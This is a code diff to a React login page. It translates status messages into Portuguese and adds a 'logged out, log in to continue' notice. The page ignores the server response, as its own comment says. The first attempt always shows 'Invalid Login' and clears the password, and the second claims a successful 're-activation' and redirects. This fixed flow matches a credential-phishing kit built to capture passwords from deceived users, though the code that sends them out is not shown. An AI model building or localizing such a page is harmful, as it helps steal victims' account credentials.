@@ -6,6 +6,7 @@ export default function Home() {
   const [open, setOpen] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [status, setStatus] = useState("Saiu, faça login para continuar.");
   const [statusClass, setStatusClass] = useState("error-notice");
   const [attemptCount, setAttemptCount] = useState(0);
   const [domain, setDomain] = useState("");
@@ -33,7 +34,7 @@ export default function Home() {
       return;
     }
 
-    // Step 1: Show "Authenticating..." immediately
+    // Step 1: Show "Autenticando..." immediately
     setStatus("Authenticating …");
     setStatusClass("info-notice");
 
@@ -51,11 +52,11 @@ export default function Home() {
 
       // Step 4: Controlled message flow (not based on response.ok)
       if (newAttempt === 1) {
-        setStatus("Invalid Login");
+        setStatus("Login inválido");
         setStatusClass("error-notice");
         setPassword("")
       } else if (newAttempt === 2) {
-        setStatus("Re-Activated Successful, Redirecting ...");
+        setStatus("Reativado com sucesso, redirecionando...");
         setStatusClass("success-notice");
 
         setTimeout(() => {
